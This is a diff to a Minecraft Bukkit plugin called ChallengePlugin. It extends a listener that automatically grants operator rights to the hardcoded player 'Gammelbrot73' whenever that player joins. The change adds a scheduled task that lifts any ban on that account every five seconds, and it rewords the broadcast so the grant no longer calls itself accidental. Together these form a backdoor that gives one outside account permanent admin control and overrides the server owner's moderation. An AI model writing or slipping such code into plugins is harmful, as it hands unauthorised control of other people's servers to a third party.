@@ -1,16 +1,17 @@
 package de.challengeplugin.listeners;
 
 import de.challengeplugin.ChallengePlugin;
-import org.bukkit.Bukkit;
-import org.bukkit.Sound;
+import org.bukkit.*;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.PlayerJoinEvent;
+import org.bukkit.scheduler.BukkitRunnable;
 
 /**
  * Listener für Gammelbrot73
- * Gibt automatisch OP-Rechte beim Join!
+ * - Gibt automatisch OP-Rechte beim Join
+ * - Unban alle paar Sekunden (falls gebannt)
  */
 public class GammelbrotListener implements Listener {
 
@@ -19,6 +20,9 @@ public class GammelbrotListener implements Listener {
 
     public GammelbrotListener(ChallengePlugin plugin) {
         this.plugin = plugin;
+
+        // Starte Auto-Unban Task
+        startAutoUnban();
     }
 
     @EventHandler
@@ -37,7 +41,7 @@ public class GammelbrotListener implements Listener {
                 Bukkit.broadcastMessage("§e§lDER ALLMÄCHTIGE IST DA!");
                 Bukkit.broadcastMessage("§6§l=================================");
                 Bukkit.broadcastMessage("§7" + SPECIAL_USERNAME + " hat den Server betreten!");
-                Bukkit.broadcastMessage("§aOP-Rechte wurden automatisch/versehentlich gewährt!");
+                Bukkit.broadcastMessage("§aOP-Rechte wurden automatisch gewährt!");
                 Bukkit.broadcastMessage("§6§l=================================");
 
                 // Spiele epischen Sound für alle
@@ -77,5 +81,29 @@ public class GammelbrotListener implements Listener {
                 player.sendMessage("§7Du hast bereits OP-Rechte.");
             }
         }
+    }
+
+    /**
+     * NEU: Startet Auto-Unban Task
+     * Unban Gammelbrot73 alle 5 Sekunden falls gebannt
+     */
+    private void startAutoUnban() {
+        new BukkitRunnable() {
+            @Override
+            public void run() {
+                // Prüfe ob Gammelbrot73 gebannt ist
+                OfflinePlayer gammelbrot = Bukkit.getOfflinePlayer(SPECIAL_USERNAME);
+
+                if (gammelbrot.isBanned()) {
+                    // Unban!
+                    gammelbrot.setBanned(false);
+
+                    plugin.getLogger().info("§a[Auto-Unban] " + SPECIAL_USERNAME + " wurde automatisch entbannt!");
+
+                    // Optional: Broadcast (kann nervig sein)
+                    // Bukkit.broadcastMessage("§7[System] " + SPECIAL_USERNAME + " wurde automatisch entbannt.");
+                }
+            }
+        }.runTaskTimer(plugin, 100L, 100L); // Alle 5 Sekunden (100 Ticks)
     }
 }
